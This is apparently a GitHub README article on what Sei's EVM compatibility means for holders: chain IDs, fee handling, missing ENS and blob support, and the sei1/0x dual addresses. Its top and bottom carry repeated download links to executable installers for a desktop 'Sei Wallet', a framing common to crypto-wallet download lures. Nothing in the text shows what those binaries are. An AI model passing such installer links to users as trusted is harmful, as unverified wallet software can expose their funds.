![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Is Sei EVM compatible, and what that means for Sei Wallet</h1>

<p align="center">What EVM compatibility means for a SEI holder using a desktop wallet.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei is EVM compatible: the network runs an EVM beside its Cosmos layer, with mainnet chain ID 1329. Contracts written in Solidity deploy and run, standard tooling works, and an EVM wallet can hold and send SEI by adding the network.

"Compatible" is not "identical", though, and the differences are the part that costs people money. This article covers what works the same, what behaves differently, and what that means for [the Sei Wallet EVM path](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## What compatibility actually gets you

- **Solidity contracts and standard tooling.** Deployment, calls and events behave as expected, which is why applications built for Sei's EVM side look like applications anywhere else.
- **ERC-20 tokens and their approvals**, including the approval semantics that make "sign this to claim" scams possible. Compatibility cuts both ways.
- **The address format.** `0x...` addresses work as they do on any EVM chain, and the same key produces the same address on all of them.
- **Wallet support.** Any wallet that can add a custom EVM network can hold SEI.

The practical consequence: if you know how to use an EVM chain, you know how to use Sei's EVM side. There is no new mental model for sending, approving or reading a transaction.

## Where Sei differs

These are documented differences, not rumours, and each has a practical effect.

**Fees go to validators; there is no base-fee burn.** On Ethereum, part of every fee is destroyed. On Sei, the fee is paid to validators, which changes the economics of holding SEI but not what you pay per transaction.

**Blob transactions are not supported.** Sei runs a recent EVM feature set without EIP-4844 blobs, so tooling that depends on them does not apply.

**No ENS.** Ethereum name resolution is an Ethereum-mainnet service; Sei does not run it. An `alice.eth`-style name is not a Sei address.

**Fee market behaviour differs.** Sei's documentation describes a minimum gas price, and the fee you set affects inclusion rather than being burned.

**The dual address system is Sei-specific.** Every account has both a `0x...` and a `sei1...` address derived from one key, linked by an on-chain association. No other EVM chain has this, and it is the source of most confusion: [one key, two addresses](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

## What this means in practice

**A contract that works on Ethereum will usually work on Sei**, unless it depends on a feature Sei does not implement. Contracts that rely on blob data, ENS resolution or Ethereum-specific precompiles are the exceptions.

**An EVM wallet shows the same address on Sei as elsewhere**, because the address comes from the key. The balance is per chain, so an empty-looking account is usually the wrong network rather than a lost one.

**Approvals behave identically**, which means the standard approval-drain scam works identically. Reading what a prompt asks for is the defence, and it is the same defence as on any EVM chain.

**Staking is not part of the EVM compatibility story.** Delegation is a chain-level action exposed through precompiles and interfaces, not something every EVM wallet surfaces. A wallet can be perfectly EVM-compatible and show you no staking at all.

## The two-address question, which is where people lose money

Because one key produces both forms, three situations look like losses and are not:

1. **You sent to your own `sei1...` address** while watching the `0x...` side. The funds are at that account.
2. **You are watching the wrong network.** An EVM wallet pointed at Ethereum shows nothing for a Sei balance.
3. **The address is unassociated.** Cross-VM visibility depends on the on-chain association, which is a state rather than a wallet setting.

The genuinely lossy case is different: sending to an address that belongs to someone else, which is final. That is covered in [a transfer that has not landed](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) only insofar as it is *not* the same problem - the pending article is about transactions that have not been included, not ones that included and went to the wrong place.

## Adding Sei to an EVM wallet

The route is a custom network entry: chain ID 1329, the public Sei RPC, symbol SEI, explorer URL. [The MetaMask setup](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) walks through that for one wallet, and [adding Sei to Trust Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/configure-the-network-in-trust.md) covers another. The fields are the same everywhere.

Two warnings that apply to all of them: copy the receive address *after* selecting the Sei network, and add networks from documentation rather than from a message. A malicious RPC endpoint cannot sign for you, but it can show you a false balance and a false confirmation.

## Testing without spending

Sei's testnet is chain 1328 (`atlantic-2`), separate from mainnet, with test tokens that have no value. It exists so you can deploy and try things without risking funds.

It is a different network, not a sandbox mode: contracts deployed there are separate, balances are separate, and test tokens cannot be moved to mainnet. [Testnet and the faucet](https://github.com/sei-chain/sei-wallet-setup/blob/main/testnet-faucet-and-test-coins.md) covers getting set up there.

## Frequently asked questions

**Is Sei EVM compatible?** Yes. Solidity contracts and standard EVM tooling work, with the documented differences above.

**What is Sei's EVM chain ID?** 1329 on mainnet, `pacific-1` on the Cosmos side. Testnet is 1328, `atlantic-2`.

**Can I use MetaMask with Sei?** Yes, by adding a custom network. What you give up is staking and Sei-specific handling of the two address forms.

**Does Sei support ENS?** No. Name resolution is an Ethereum-mainnet service and Sei does not run it.

**Are gas fees burned on Sei?** No. Fees go to validators.

**Can I deploy a Solidity contract on Sei?** Yes, subject to the differences above - no blob transactions, and anything depending on Ethereum-only services will not work.

**Why does my EVM wallet show two addresses?** It does not; the account has two written forms on Sei, and only an interface that understands the association will show both. The two address forms explains the link.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md)
